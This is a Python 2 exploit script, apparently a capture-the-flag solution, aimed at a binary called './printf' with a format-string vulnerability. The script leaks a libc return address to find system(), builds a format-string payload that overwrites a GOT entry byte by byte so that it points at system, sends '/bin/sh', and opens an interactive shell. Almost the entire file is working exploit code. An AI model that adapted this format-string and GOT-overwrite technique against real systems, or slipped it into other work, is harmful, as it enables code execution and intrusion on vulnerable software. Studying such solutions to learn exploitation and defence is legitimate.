#!/usr/bin/env python2.7
# -*- coding:utf-8 -*-
from mkpwn import *

# settings
local   = True
debug   = False

if local:
    target  = './printf'
else:
    target  = ('0', 0)

# get io
io  = mk(target, debug)

# global
offset_system                   = 0x00040190
offset___libc_start_main_ret    = 0x19a83
got_print   = 0x804a00c

def get_fmt(target, offset):
    val3    = (target & 0xff000000) >> 24
    val2    = (target & 0xff0000) >> 16
    val1    = (target & 0xff00) >> 8
    val0    = (target & 0xff)

    byt     = [val3, val2, val1, val0]
    dic     = {val3:3, val2:2, val1:1, val0:0}
    byt.sort()
    fmts    = ''
    count   = 0
    for i in xrange(4):
        if i == 0:
            fmts += fmt('w', offset = dic[byt[i]] + offset, target_val = byt[i], width = 1)
        else:
            fmts += fmt('w', offset = dic[byt[i]] + offset, target_val = byt[i] - byt[i-1], width = 1)
    return fmts

# exp
def exp():
    # io.hint([0x80486a6])
    io.ru('First input:')
    io.pr(fmt('r', offset = 0x6b))
    io.ru('Second input:')
    io.pr()

    libc___libc_start_main_ret = int(io.ru(',')[2:-1], 16)
    libc_base   = libc___libc_start_main_ret - offset___libc_start_main_ret
    libc_system = libc_base + offset_system
    info_found('__libc_start_main_ret', libc___libc_start_main_ret)
    info_found('libc_base', libc_base)
    info_found('lib_system', libc_system)

    io.ru('First input:')
    io.pr(get_fmt(libc_system, 0x1f).ljust(0x60, '.') + l32(got_print) + l32(got_print + 1) + l32(got_print + 2) + l32(got_print + 3) + ':)')
    io.ru('Second input:')
    io.pr("/bin/sh\x00")

    io.ru(':)')
    info_shell()
    io.interact()

# main
if __name__ == '__main__':
    exp()
